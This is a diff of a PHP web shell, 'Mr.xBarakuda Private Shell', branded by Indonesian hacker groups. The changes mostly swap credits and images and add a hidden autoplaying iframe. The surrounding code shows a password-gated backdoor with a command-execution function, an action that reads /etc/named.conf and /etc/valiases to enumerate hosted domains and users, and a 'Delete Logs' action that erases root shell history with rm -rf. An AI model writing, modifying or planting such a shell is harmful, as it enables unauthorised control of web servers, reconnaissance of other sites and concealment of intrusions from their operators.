@@ -1,6 +1,6 @@
 <?php
 #####################################################################
-##              Title : Mr.xBarakuda Private Shell v2              ##
+##            Recod3d By : Mr.xBarakuda                            ##
 ##         Kelebihan  Fitur : Biasanya undetect pada server        ##
 ##   Thanks buat yang udah buat shell ini , kami hanya recode saja ##
 #####################################################################
@@ -47,7 +47,7 @@ input[type=password] {
 <br>
 <br>
 <header>
-<img src='https://1.bp.blogspot.com/-4tOJ4k2vcY4/WclSsGeuDNI/AAAAAAAAACM/wgxIWSXOqLsJtdgeY9SiCXt8uao6YPGUgCLcBGAs/s320/21740626_2180662082160348_5023158995146835701_n.png' width='334' height='334' align='center'>
+<img src='https://1.bp.blogspot.com/-4tOJ4k2vcY4/WclSsGeuDNI/AAAAAAAAACM/wgxIWSXOqLsJtdgeY9SiCXt8uao6YPGUgCLcBGAs/s320/21740626_2180662082160348_5023158995146835701_n.png' width='300' height='300' align='center'>
 <br>
 <br>
 <pre align=center><form method='post'><input type='password' name='pass' style='background-color:none;border:1px solid #FFF;outline:none;' required><input type=submit value='Masuk Coeg!' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>
@@ -81,7 +81,8 @@ if(!empty($auth_pass)) {
  	font-family: Electrolize, sans-serif;
 }
  	body { 
-    background-image: url(" https://s-media-cache-ak0.pinimg.com/originals/e3/77/46/e377461761c8ab33fbb713ada400984a.gif ");
+    background-image: url(" http://cloud-3.steamusercontent.com/ugc/266095116623483831/C390B91470396BC66A3568D2466F393AF50C5D2E/ ");
+    cursor: url(http://cur.cursors-4u.net/cursors/cur-11/cur1025.ani), url(http://cur.cursors-4u.net/cursors/cur-11/cur1025.png), progress !important;
     background-color: black;
     background-size: 100% 100%;
     background-repeat:no-repeat;
@@ -219,12 +220,20 @@ a.nav-fokus:hover {color:#FFFFFF; background:#191919; border-top:0px; border-lef
 }
 </style>
 </head>
-<BODY>
+<body>
+<iframe width="1" height="1" src="http://www.youtube.com/embed/zz2cX9O5wpk?rel=0&autoplay=1&loop=1" frameborder="0" allowfullscreen></iframe></body>
 <center><a href='https://instagram.com/x_barakuda'><h1><font color='red' face='courier new'>Mr.xBarakuda Private Shell</font></h1></a><img src="https://lh3.googleusercontent.com/-Q82IsH9hQa0/AAAAAAAAAAI/AAAAAAAAACA/nOq1GZZgwSE/photo.jpg" width="20%" height="17%"></a></center>
 <br>
 <?php
 function w($dir,$perm) {
 	if(!is_writable($dir)) {
+		return "<font color=red>".$perm."</font>";
+	} else {
+		return "<font color=green>".$perm."</font>";
+	}
+}
+function r($dir,$perm) {
+	if(!is_readable($dir)) {
 		return "<font color=red>".$perm."</font>";
 	} else {
 		return "<font color=green>".$perm."</font>";
@@ -264,7 +273,7 @@ function exe($cmd) {
 		return $buff; 	
 	} 
 }
-function sulap($text) {
+function magic($text) {
   if(!get_magic_quotes_gpc()) {
     return $text;
 	}
@@ -475,7 +484,7 @@ echo '<form action="?patch='.$path.'&do=logout" method="post">';
     echo 'Good Bye!!';
 } elseif($_GET['xBarakuda'] == 'domains'){echo "<center><div class='mybox'><p align='center' class='cgx2'>Domains and Users</p>";$d0mains = @file("/etc/named.conf");if(!$d0mains){die("<center>Error : can't read [ /etc/named.conf ]</center>");}echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";flush();}}}echo'</div></center>';
 } elseif($_GET['delete'] == 'logs') {
-  	echo '<br><center><b><span>Delete Logs ( For Safety can be fun :v )</span></b><center><br>';
+  	echo '<br><center><b><span>Delete Logs ( For Safety can be fun = Supported By Fiesta :v )</span></b><center><br>';
 	echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";      
 	exec("rm -rf /tmp/logs");
 	exec("rm -rf /root/.ksh_history");
@@ -2154,7 +2163,7 @@ echo '</center></td>
 echo '</table>
 </div>';
 }
-echo '<br><br><hr color="red"><br><center>Copyright &copy '.date("Y").' <a href="https://instagram.com/x_barakuda" target="_blank">Mr.xBarakuda</a> - <a href="https://www.facebook.com/xaisyndicate" target="_blank">XaiSyndicate</a> - <a href="https://www.facebook.com/babbycyberteam" target="_blank">BabbyCyberTeam'.$_COPY.'</a></center>
+echo '<br><br><hr color="red"><br><center>Copyright &copy '.date("Y").' <a href="http://www.xaisyndicate.net/" target="_blank">XaiSyndicate</a> - <a href="http://con7extofficial.blogspot.co.id/" target="_blank">Con7ext Official</a> - <a href="http://babbycyberteam1337.blogspot.co.id/" target="_blank">BabbyCyberTeam'.$_COPY.'</a></center>
 </body>
 </html>';
 ?>
